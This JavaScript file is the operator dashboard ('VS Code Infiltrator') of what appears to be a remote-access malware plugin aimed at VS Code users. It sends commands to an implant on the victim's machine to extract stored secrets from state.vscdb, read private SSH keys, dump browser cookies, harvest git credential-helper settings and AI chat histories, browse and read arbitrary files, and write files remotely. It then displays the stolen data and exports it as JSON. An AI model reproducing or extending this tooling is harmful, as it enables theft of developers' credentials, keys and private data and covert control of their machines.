// VS Code Infiltrator — ui.js
// Dashboard UI for browsing project state, files, git info, secrets, and chat history.

var currentTab = 'project';
var projectInfo = null;
var gitInfo = null;
var allSecrets = [];
var allSSHKeys = [];
var allCookies = [];
var chatSessions = [];
var currentChatMessages = [];
var allErrors = [];
var _refreshTimer = null;

// File browser state
var currentDir = '';
var currentFilePath = '';
var currentFileContent = '';
var editMode = false;

function esc(str) {
    if (str === null || str === undefined) return '';
    var div = document.createElement('div');
    div.appendChild(document.createTextNode(String(str)));
    return div.innerHTML;
}

function humanSize(bytes) {
    if (!bytes || bytes < 1024) return (bytes || 0) + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
}

// ===== Send command to plugin via server =====

function sendCommand(command) {
    return fetch('/api/plugins/vscode/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ clientID: pluginUI.clientId, command: command })
    }).then(function(r) { return r.json(); });
}

// ===== Tab switching =====

var tabs = pluginUI.container.querySelectorAll('[data-vsc-tab]');
for (var t = 0; t < tabs.length; t++) {
    (function(tab) {
        tab.onclick = function(e) {
            e.preventDefault();
            currentTab = tab.getAttribute('data-vsc-tab');
            for (var x = 0; x < tabs.length; x++) {
                tabs[x].className = 'nav-link' + (tabs[x] === tab ? ' active' : '');
            }
            var tabNames = ['project', 'files', 'git', 'chat', 'errors'];
            for (var i = 0; i < tabNames.length; i++) {
                var el = pluginUI.container.querySelector('#vsc-tab-' + tabNames[i]);
                if (el) el.style.display = tabNames[i] === currentTab ? '' : 'none';
            }
        };
    })(tabs[t]);
}

// ===== Project Tab Rendering =====

function renderProject() {
    var statusEl = pluginUI.container.querySelector('#vsc-project-status');

    if (!projectInfo) {
        if (statusEl) statusEl.textContent = 'Waiting for data...';
        return;
    }

    var d = projectInfo;
    if (statusEl) statusEl.textContent = 'Workspace: ' + (d.workspacePath || 'unknown');

    // Workspace path
    var pathEl = pluginUI.container.querySelector('#vsc-workspace-path');
    if (pathEl) pathEl.textContent = d.workspacePath || '--';

    // Open editors
    var editorsEl = pluginUI.container.querySelector('#vsc-open-editors');
    if (editorsEl) {
        if (d.openEditors && d.openEditors.length > 0) {
            var html = '';
            for (var i = 0; i < d.openEditors.length; i++) {
                html += '<div style="font-family:monospace;color:#aaa">' + esc(d.openEditors[i]) + '</div>';
            }
            editorsEl.innerHTML = html;
        } else {
            editorsEl.innerHTML = '<span class="text-muted">None detected</span>';
        }
    }

    // Recent projects
    var recentEl = pluginUI.container.querySelector('#vsc-recent-projects');
    if (recentEl) {
        if (d.recentProjects && d.recentProjects.length > 0) {
            var html2 = '';
            for (var j = 0; j < d.recentProjects.length; j++) {
                html2 += '<div style="font-family:monospace;color:#aaa">' + esc(d.recentProjects[j]) + '</div>';
            }
            recentEl.innerHTML = html2;
        } else {
            recentEl.innerHTML = '<span class="text-muted">None</span>';
        }
    }

    // Extensions
    var extEl = pluginUI.container.querySelector('#vsc-extensions');
    if (extEl) {
        if (d.extensions && d.extensions.length > 0) {
            var html3 = '<span class="badge bg-secondary me-1">' + d.extensions.length + ' installed</span><br>';
            for (var k = 0; k < d.extensions.length; k++) {
                html3 += '<div style="font-family:monospace;color:#aaa;font-size:0.85em">' + esc(d.extensions[k]) + '</div>';
            }
            extEl.innerHTML = html3;
        } else {
            extEl.innerHTML = '<span class="text-muted">None found</span>';
        }
    }

    // File tree
    var treeEl = pluginUI.container.querySelector('#vsc-file-tree');
    if (treeEl) {
        if (d.fileTree && d.fileTree.length > 0) {
            var html4 = '';
            for (var m = 0; m < d.fileTree.length; m++) {
                var entry = d.fileTree[m];
                var icon = entry.type === 'dir' ? '&#128193; ' : '&#128196; ';
                html4 += '<div style="font-family:monospace;color:#aaa">' + icon + esc(entry.name) +
                    (entry.type === 'file' ? ' <span class="text-muted">(' + humanSize(entry.size) + ')</span>' : '') +
                    '</div>';
            }
            treeEl.innerHTML = html4;
        } else {
            treeEl.innerHTML = '<span class="text-muted">Empty or not found</span>';
        }
    }

    // Initialize file browser directory from workspace path
    if (!currentDir && d.workspacePath) {
        currentDir = d.workspacePath;
        var dirInput = pluginUI.container.querySelector('#vsc-dir-input');
        if (dirInput) dirInput.value = currentDir;
    }
}

// ===== Files Tab =====

function renderDirListing(data) {
    var listEl = pluginUI.container.querySelector('#vsc-dir-listing');
    var breadcrumb = pluginUI.container.querySelector('#vsc-dir-breadcrumb');
    var upBtn = pluginUI.container.querySelector('#vsc-dir-up-btn');
    var dirInput = pluginUI.container.querySelector('#vsc-dir-input');

    if (!data || !data.entries) {
        if (listEl) listEl.innerHTML = '<div class="text-muted small p-2">No entries</div>';
        return;
    }

    currentDir = data.dirPath;
    if (dirInput) dirInput.value = currentDir;
    if (breadcrumb) breadcrumb.textContent = currentDir;
    if (upBtn) upBtn.style.display = '';

    var html = '';
    for (var i = 0; i < data.entries.length; i++) {
        var entry = data.entries[i];
        var isDir = entry.type === 'dir';
        var icon = isDir ? '&#128193;' : '&#128196;';
        var sizeStr = isDir ? '' : ' <span class="text-muted">(' + humanSize(entry.size) + ')</span>';
        html += '<div class="vsc-dir-entry" data-name="' + esc(entry.name) + '" data-type="' + entry.type + '">' +
            icon + ' ' + esc(entry.name) + sizeStr + '</div>';
    }

    if (!html) html = '<div class="text-muted small p-2">Empty directory</div>';
    listEl.innerHTML = html;

    // Wire click handlers
    var entries = listEl.querySelectorAll('.vsc-dir-entry');
    for (var j = 0; j < entries.length; j++) {
        (function(el) {
            el.onclick = function() {
                var name = el.getAttribute('data-name');
                var type = el.getAttribute('data-type');
                // Build full path — need to handle separator
                var sep = currentDir.indexOf('\\') !== -1 ? '\\' : '/';
                var full = currentDir + sep + name;
                if (type === 'dir') {
                    navigateDir(full);
                } else {
                    readFileFromBrowser(full);
                }
            };
        })(entries[j]);
    }
}

function navigateDir(dirPath) {
    sendCommand({ action: 'list_dir', dirPath: dirPath });
    // Data arrives async via polling
    _pendingDirRequest = true;
}

var _pendingDirRequest = false;
var _pendingFileRequest = false;
var _pendingChatRequest = false;

function readFileFromBrowser(filePath) {
    currentFilePath = filePath;
    var nameEl = pluginUI.container.querySelector('#vsc-file-name');
    if (nameEl) nameEl.textContent = filePath;

    var pathInput = pluginUI.container.querySelector('#vsc-file-path-input');
    if (pathInput) pathInput.value = filePath;

    sendCommand({ action: 'read_file', filePath: filePath });
    _pendingFileRequest = true;
}

function renderFileContent(data) {
    var viewerEl = pluginUI.container.querySelector('#vsc-file-viewer');
    var nameEl = pluginUI.container.querySelector('#vsc-file-name');
    var sizeEl = pluginUI.container.querySelector('#vsc-file-size');
    var editBtn = pluginUI.container.querySelector('#vsc-edit-toggle-btn');

    if (!data) return;

    currentFilePath = data.filePath;
    currentFileContent = data.content || '';

    if (nameEl) nameEl.textContent = data.filePath;
    if (sizeEl) sizeEl.textContent = humanSize(data.size);
    if (viewerEl) viewerEl.textContent = data.content || '';
    if (editBtn) editBtn.style.display = '';

    // Update path input
    var pathInput = pluginUI.container.querySelector('#vsc-file-path-input');
    if (pathInput) pathInput.value = data.filePath;
}

// ===== Git & Creds Tab =====

function renderGitInfo() {
    var container = pluginUI.container.querySelector('#vsc-git-info');
    if (!container || !gitInfo) return;

    if (gitInfo.error) {
        container.innerHTML = '<span class="text-danger">' + esc(gitInfo.error) + '</span>';
        return;
    }

    var html = '<div class="mb-1"><span class="text-muted">Branch:</span> <span class="text-white">' + esc(gitInfo.branch) + '</span></div>' +
        '<div class="mb-1"><span class="text-muted">User:</span> ' + esc(gitInfo.userName) + ' &lt;' + esc(gitInfo.userEmail) + '&gt;</div>' +
        '<div class="mb-1"><span class="text-muted">Credential Helper:</span> <span class="badge ' +
        (gitInfo.credentialHelper ? 'bg-warning text-dark' : 'bg-secondary') + '">' +
        esc(gitInfo.credentialHelper || 'none') + '</span></div>';

    if (gitInfo.remotes) {
        html += '<div class="mb-1"><span class="text-muted">Remotes:</span><pre style="background:#1e1e1e;padding:6px;border-radius:4px;font-size:0.85em;margin:4px 0">' +
            esc(gitInfo.remotes) + '</pre></div>';
    }

    if (gitInfo.log) {
        html += '<div><span class="text-muted">Recent Commits:</span><pre style="background:#1e1e1e;padding:6px;border-radius:4px;font-size:0.85em;margin:4px 0;max-height:200px;overflow:auto">' +
            esc(gitInfo.log) + '</pre></div>';
    }

    container.innerHTML = html;
}

function renderSecrets() {
    var tbody = pluginUI.container.querySelector('#vsc-secrets-body');
    if (!tbody) return;

    if (allSecrets.length === 0) {
        tbody.innerHTML = '<tr><td colspan="2" class="text-muted">Not collected</td></tr>';
        return;
    }

    // Get the latest secrets payload
    var latest = allSecrets[0].data || {};
    var entries = latest.entries || [];

    if (entries.length === 0) {
        tbody.innerHTML = '<tr><td colspan="2" class="text-muted">No secrets found in state.vscdb</td></tr>';
        return;
    }

    var html = '';
    for (var i = 0; i < entries.length; i++) {
        var e = entries[i];
        html += '<tr>' +
            '<td style="font-family:monospace;font-size:0.8em;max-width:250px;word-break:break-all">' + esc(e.key) + '</td>' +
            '<td style="font-family:monospace;font-size:0.8em;max-width:400px;word-break:break-all">' + esc(e.value) + '</td>' +
            '</tr>';
    }
    tbody.innerHTML = html;
}

function renderSSHKeys() {
    var container = pluginUI.container.querySelector('#vsc-ssh-keys');
    if (!container) return;

    if (allSSHKeys.length === 0) {
        container.innerHTML = '<span class="text-muted">Not collected</span>';
        return;
    }

    var latest = allSSHKeys[0].data || {};
    var keys = latest.keys || [];

    if (keys.length === 0) {
        container.innerHTML = '<span class="text-muted">No SSH keys found</span>';
        return;
    }

    var html = '<div class="table-responsive"><table class="table table-sm table-dark table-striped mb-0">' +
        '<thead><tr><th>File</th><th>Size</th><th>Type</th><th>Content / Action</th></tr></thead><tbody>';

    for (var i = 0; i < keys.length; i++) {
        var k = keys[i];
        var typeBadge = k.isPublic ? '<span class="badge bg-success">public</span>' :
            (k.name === 'config' || k.name === 'known_hosts' || k.name === 'authorized_keys') ?
            '<span class="badge bg-info">' + esc(k.name) + '</span>' :
            '<span class="badge bg-danger">private</span>';

        var contentCell = '';
        if (k.content) {
            contentCell = '<pre style="background:#1e1e1e;padding:4px;border-radius:3px;font-size:0.8em;margin:0;max-height:60px;overflow:auto;white-space:pre-wrap">' +
                esc(k.content) + '</pre>';
        } else {
            contentCell = '<button class="btn btn-primary btn-sm vsc-ssh-read-btn" data-name="' + esc(k.name) + '">Read</button>';
        }

        html += '<tr>' +
            '<td style="font-family:monospace;font-size:0.85em">' + esc(k.name) + '</td>' +
            '<td class="small">' + humanSize(k.size) + '</td>' +
            '<td>' + typeBadge + '</td>' +
            '<td>' + contentCell + '</td>' +
            '</tr>';
    }

    html += '</tbody></table></div>';
    container.innerHTML = html;

    // Wire SSH read buttons
    var readBtns = container.querySelectorAll('.vsc-ssh-read-btn');
    for (var j = 0; j < readBtns.length; j++) {
        (function(btn) {
            btn.onclick = function() {
                var keyName = btn.getAttribute('data-name');
                sendCommand({ action: 'read_ssh_key', keyName: keyName });
                btn.disabled = true;
                btn.textContent = 'Fetching...';
            };
        })(readBtns[j]);
    }
}

function renderCookies() {
    var tbody = pluginUI.container.querySelector('#vsc-cookies-body');
    if (!tbody) return;

    if (allCookies.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" class="text-muted">Not collected</td></tr>';
        return;
    }

    var latest = allCookies[0].data || {};
    var cookies = latest.cookies || [];

    if (cookies.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" class="text-muted">No cookies found</td></tr>';
        return;
    }

    var html = '';
    for (var i = 0; i < cookies.length; i++) {
        var c = cookies[i];
        html += '<tr>' +
            '<td style="font-size:0.85em">' + esc(c.host) + '</td>' +
            '<td style="font-size:0.85em">' + esc(c.name) + '</td>' +
            '<td style="font-size:0.85em">' + esc(c.path) + '</td>' +
            '<td><span class="badge ' + (c.secure ? 'bg-success' : 'bg-secondary') + '">' + (c.secure ? 'Yes' : 'No') + '</span></td>' +
            '<td><span class="badge ' + (c.httpOnly ? 'bg-danger' : 'bg-secondary') + '">' + (c.httpOnly ? 'Yes' : 'No') + '</span></td>' +
            '</tr>';
    }
    tbody.innerHTML = html;
}

// ===== Chat History Tab =====

function renderChatSessions() {
    var listEl = pluginUI.container.querySelector('#vsc-chat-session-list');
    var countEl = pluginUI.container.querySelector('#vsc-chat-count');

    if (!listEl) return;

    if (chatSessions.length === 0) {
        listEl.innerHTML = '<div class="text-muted small p-2">No sessions found</div>';
        if (countEl) countEl.textContent = '0';
        return;
    }

    // Get the latest scan result
    var latest = chatSessions[0].data || {};
    var sessions = latest.sessions || [];
    if (countEl) countEl.textContent = String(sessions.length);

    if (sessions.length === 0) {
        listEl.innerHTML = '<div class="text-muted small p-2">No chat sessions found</div>';
        return;
    }

    var html = '';
    for (var i = 0; i < sessions.length; i++) {
        var s = sessions[i];
        var title = s.title || s.name || 'Untitled';
        var reqCount = s.requestCount || 0;
        var sourceLabel = s.source === 'global' ? '<span class="badge bg-info">global</span>' :
            '<span class="badge bg-secondary">workspace</span>';
        var countLabel = reqCount > 0 ? '<span class="badge bg-success ms-1">' + reqCount + ' msg</span>' :
            '<span class="badge bg-dark ms-1">empty</span>';
        var modified = s.modified ? new Date(s.modified).toLocaleDateString() : '';

        html += '<div class="vsc-sidebar-item" data-session-file="' + esc(s.file) + '" data-session-title="' + esc(title) + '">' +
            '<div class="text-white small">' + esc(title.substring(0, 60)) + '</div>' +
            '<div>' + sourceLabel + countLabel + ' <span class="text-muted" style="font-size:0.75em">' + humanSize(s.size) + ' ' + esc(modified) + '</span></div>' +
            '</div>';
    }

    listEl.innerHTML = html;

    // Wire click handlers
    var items = listEl.querySelectorAll('.vsc-sidebar-item');
    for (var j = 0; j < items.length; j++) {
        (function(item) {
            item.onclick = function() {
                // Highlight active
                var all = listEl.querySelectorAll('.vsc-sidebar-item');
                for (var k = 0; k < all.length; k++) all[k].classList.remove('active');
                item.classList.add('active');

                var sessionFile = item.getAttribute('data-session-file');
                var title = item.getAttribute('data-session-title');
                var titleEl = pluginUI.container.querySelector('#vsc-chat-title');
                if (titleEl) titleEl.textContent = title;

                sendCommand({ action: 'read_chat', sessionFile: sessionFile });
                _pendingChatRequest = true;
            };
        })(items[j]);
    }
}

function renderChatHistory(data) {
    var viewer = pluginUI.container.querySelector('#vsc-chat-viewer');
    var titleEl = pluginUI.container.querySelector('#vsc-chat-title');
    if (!viewer || !data) return;

    if (titleEl && data.title) titleEl.textContent = data.title;

    var messages = data.messages || [];
    if (messages.length === 0) {
        viewer.innerHTML = '<div class="text-muted small p-2">No messages in this session</div>';
        return;
    }

    var html = '';
    for (var i = 0; i < messages.length; i++) {
        var msg = messages[i];

        // User message
        if (msg.text) {
            html += '<div class="vsc-chat-user">' +
                '<div class="d-flex align-items-center mb-1">' +
                '<span class="badge bg-info me-2">User</span>' +
                (msg.model ? '<span class="text-muted" style="font-size:0.75em">' + esc(msg.model) + '</span>' : '') +
                '</div>' +
                '<div style="white-space:pre-wrap;font-size:0.9em">' + esc(msg.text) + '</div>';

            if (msg.files && msg.files.length > 0) {
                html += '<div class="mt-1">';
                for (var f = 0; f < msg.files.length; f++) {
                    html += '<span class="badge bg-dark me-1" style="font-size:0.7em">' + esc(String(msg.files[f])) + '</span>';
                }
                html += '</div>';
            }
            html += '</div>';
        }

        // AI response
        if (msg.response) {
            html += '<div class="vsc-chat-ai">' +
                '<div class="d-flex align-items-center mb-1">' +
                '<span class="badge bg-secondary me-2">AI</span>' +
                '</div>' +
                '<div style="white-space:pre-wrap;font-size:0.9em">' + esc(msg.response) + '</div>' +
                '</div>';
        }
    }

    viewer.innerHTML = html;
    // Scroll to bottom
    viewer.scrollTop = viewer.scrollHeight;
}

// ===== Errors =====

function renderErrors() {
    var tbody = pluginUI.container.querySelector('#vsc-errors-body');
    if (!tbody) return;

    if (allErrors.length === 0) {
        tbody.innerHTML = '<tr><td colspan="3" class="text-muted">No errors</td></tr>';
        return;
    }

    var html = '';
    for (var i = 0; i < allErrors.length; i++) {
        var row = allErrors[i];
        var d = row.data || {};
        var ts = row.timeStamp ? new Date(row.timeStamp).toLocaleString() : '';
        html += '<tr>' +
            '<td>' + esc(d.phase || '') + '</td>' +
            '<td class="small" style="max-width:500px;word-break:break-all">' + esc(d.error || JSON.stringify(d)) + '</td>' +
            '<td class="small">' + esc(ts) + '</td>' +
            '</tr>';
    }
    tbody.innerHTML = html;
}

// ===== Data loading =====

function loadAllData() {
    if (!pluginUI.container || !pluginUI.container.parentNode) {
        if (_refreshTimer) { clearInterval(_refreshTimer); _refreshTimer = null; }
        return;
    }

    // Project info
    pluginUI.fetchData('project_info', 10, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            projectInfo = rows[0].data;
            renderProject();
        }
    });

    // Git info
    pluginUI.fetchData('git_info', 10, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            gitInfo = rows[0].data;
            renderGitInfo();
        }
    });

    // Secrets
    pluginUI.fetchData('secrets', 10, 0).then(function(result) {
        allSecrets = result.rows || [];
        renderSecrets();
    });

    // SSH Keys
    pluginUI.fetchData('ssh_keys', 10, 0).then(function(result) {
        allSSHKeys = result.rows || [];
        renderSSHKeys();
    });

    // Cookies
    pluginUI.fetchData('cookies', 10, 0).then(function(result) {
        allCookies = result.rows || [];
        renderCookies();
    });

    // Chat sessions
    pluginUI.fetchData('chat_sessions', 10, 0).then(function(result) {
        chatSessions = result.rows || [];
        renderChatSessions();
    });

    // Dir listing (check for new responses)
    if (_pendingDirRequest) {
        pluginUI.fetchData('dir_listing', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                renderDirListing(rows[0].data);
                _pendingDirRequest = false;
            }
        });
    }

    // File content (check for new responses)
    if (_pendingFileRequest) {
        pluginUI.fetchData('file_content', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                var latest = rows[0].data;
                if (latest.filePath === currentFilePath) {
                    renderFileContent(latest);
                    _pendingFileRequest = false;
                }
            }
        });
    }

    // Chat history (check for new responses)
    if (_pendingChatRequest) {
        pluginUI.fetchData('chat_history', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                renderChatHistory(rows[0].data);
                _pendingChatRequest = false;
            }
        });
    }

    // Errors
    pluginUI.fetchData('_error', 100, 0).then(function(result) {
        allErrors = result.rows || [];
        renderErrors();
        var errTab = pluginUI.container.querySelector('[data-vsc-tab="errors"]');
        if (errTab && allErrors.length > 0) {
            errTab.innerHTML = 'Errors <span class="badge bg-danger">' + allErrors.length + '</span>';
        }
    });
}

// ===== Wire buttons =====

// Refresh (project)
var refreshBtn = pluginUI.container.querySelector('#vsc-refresh-btn');
if (refreshBtn) {
    refreshBtn.onclick = function() {
        sendCommand({ action: 'refresh' });
        refreshBtn.disabled = true;
        refreshBtn.textContent = 'Refreshing...';
        setTimeout(function() {
            refreshBtn.disabled = false;
            refreshBtn.textContent = 'Refresh';
        }, 3000);
    };
}

// Clear data
var clearBtn = pluginUI.container.querySelector('#vsc-clear-btn');
if (clearBtn) {
    clearBtn.onclick = function() {
        if (confirm('Clear all collected VS Code data?')) {
            pluginUI.deleteData().then(function() { loadAllData(); });
        }
    };
}

// Export JSON
var exportBtn = pluginUI.container.querySelector('#vsc-export-btn');
if (exportBtn) {
    exportBtn.onclick = function() {
        var exportData = {
            project: projectInfo,
            git: gitInfo,
            secrets: allSecrets.map(function(r) { return r.data; }),
            sshKeys: allSSHKeys.map(function(r) { return r.data; }),
            cookies: allCookies.map(function(r) { return r.data; }),
            chatSessions: chatSessions.map(function(r) { return r.data; }),
            errors: allErrors.map(function(r) { return r.data; }),
            exportedAt: new Date().toISOString()
        };
        var blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = 'vscode_extract_' + Date.now() + '.json';
        a.click();
        URL.revokeObjectURL(url);
    };
}

// Git collect
var gitRefreshBtn = pluginUI.container.querySelector('#vsc-git-refresh-btn');
if (gitRefreshBtn) {
    gitRefreshBtn.onclick = function() {
        sendCommand({ action: 'collect_git' });
        gitRefreshBtn.disabled = true;
        gitRefreshBtn.textContent = 'Collecting...';
        setTimeout(function() {
            gitRefreshBtn.disabled = false;
            gitRefreshBtn.textContent = 'Collect Git Info';
        }, 3000);
    };
}

// Secrets
var secretsBtn = pluginUI.container.querySelector('#vsc-secrets-btn');
if (secretsBtn) {
    secretsBtn.onclick = function() {
        sendCommand({ action: 'collect_secrets' });
        secretsBtn.disabled = true;
        secretsBtn.textContent = 'Extracting...';
        setTimeout(function() {
            secretsBtn.disabled = false;
            secretsBtn.textContent = 'Extract Secrets';
        }, 3000);
    };
}

// SSH Keys
var sshBtn = pluginUI.container.querySelector('#vsc-ssh-btn');
if (sshBtn) {
    sshBtn.onclick = function() {
        sendCommand({ action: 'collect_ssh' });
        sshBtn.disabled = true;
        sshBtn.textContent = 'Scanning...';
        setTimeout(function() {
            sshBtn.disabled = false;
            sshBtn.textContent = 'Scan SSH Keys';
        }, 3000);
    };
}

// Cookies
var cookiesBtn = pluginUI.container.querySelector('#vsc-cookies-btn');
if (cookiesBtn) {
    cookiesBtn.onclick = function() {
        sendCommand({ action: 'collect_cookies' });
        cookiesBtn.disabled = true;
        cookiesBtn.textContent = 'Dumping...';
        setTimeout(function() {
            cookiesBtn.disabled = false;
            cookiesBtn.textContent = 'Dump Cookies';
        }, 3000);
    };
}

// Chat sessions scan
var chatRefreshBtn = pluginUI.container.querySelector('#vsc-chat-refresh-btn');
if (chatRefreshBtn) {
    chatRefreshBtn.onclick = function() {
        sendCommand({ action: 'list_chat_sessions' });
        chatRefreshBtn.disabled = true;
        chatRefreshBtn.textContent = 'Scanning...';
        setTimeout(function() {
            chatRefreshBtn.disabled = false;
            chatRefreshBtn.textContent = 'Scan Sessions';
        }, 3000);
    };
}

// File browser — directory navigation
var dirGoBtn = pluginUI.container.querySelector('#vsc-dir-go-btn');
var dirInput = pluginUI.container.querySelector('#vsc-dir-input');
if (dirGoBtn && dirInput) {
    dirGoBtn.onclick = function() {
        var dirPath = dirInput.value.trim();
        if (dirPath) navigateDir(dirPath);
    };
    dirInput.onkeydown = function(e) {
        if (e.key === 'Enter') dirGoBtn.click();
    };
}

// Directory up
var dirUpBtn = pluginUI.container.querySelector('#vsc-dir-up-btn');
if (dirUpBtn) {
    dirUpBtn.onclick = function() {
        if (!currentDir) return;
        // Go to parent directory
        var sep = currentDir.indexOf('\\') !== -1 ? '\\' : '/';
        var parts = currentDir.split(sep);
        parts.pop();
        var parent = parts.join(sep) || sep;
        navigateDir(parent);
    };
}

// Read file by path
var readFileBtn = pluginUI.container.querySelector('#vsc-read-file-btn');
var filePathInput = pluginUI.container.querySelector('#vsc-file-path-input');
if (readFileBtn && filePathInput) {
    readFileBtn.onclick = function() {
        var filePath = filePathInput.value.trim();
        if (filePath) readFileFromBrowser(filePath);
    };
    filePathInput.onkeydown = function(e) {
        if (e.key === 'Enter') readFileBtn.click();
    };
}

// Edit toggle
var editToggleBtn = pluginUI.container.querySelector('#vsc-edit-toggle-btn');
if (editToggleBtn) {
    editToggleBtn.onclick = function() {
        editMode = !editMode;
        var writePanel = pluginUI.container.querySelector('#vsc-write-panel');
        var textarea = pluginUI.container.querySelector('#vsc-write-textarea');
        var viewer = pluginUI.container.querySelector('#vsc-file-viewer');

        if (editMode) {
            writePanel.style.display = '';
            viewer.style.display = 'none';
            textarea.value = currentFileContent;
            editToggleBtn.textContent = 'View';
        } else {
            writePanel.style.display = 'none';
            viewer.style.display = '';
            editToggleBtn.textContent = 'Edit';
        }
    };
}

// Save file
var saveFileBtn = pluginUI.container.querySelector('#vsc-save-file-btn');
if (saveFileBtn) {
    saveFileBtn.onclick = function() {
        var textarea = pluginUI.container.querySelector('#vsc-write-textarea');
        if (!currentFilePath || !textarea) return;

        sendCommand({ action: 'write_file', filePath: currentFilePath, content: textarea.value });
        saveFileBtn.disabled = true;
        saveFileBtn.textContent = 'Saving...';
        setTimeout(function() {
            saveFileBtn.disabled = false;
            saveFileBtn.textContent = 'Save';
        }, 2000);
    };
}

// Cancel edit
var cancelEditBtn = pluginUI.container.querySelector('#vsc-cancel-edit-btn');
if (cancelEditBtn) {
    cancelEditBtn.onclick = function() {
        editMode = false;
        var writePanel = pluginUI.container.querySelector('#vsc-write-panel');
        var viewer = pluginUI.container.querySelector('#vsc-file-viewer');
        var editBtn = pluginUI.container.querySelector('#vsc-edit-toggle-btn');
        writePanel.style.display = 'none';
        viewer.style.display = '';
        if (editBtn) editBtn.textContent = 'Edit';
    };
}

// ===== Initial load + auto-refresh =====
loadAllData();
_refreshTimer = setInterval(loadAllData, 5000);
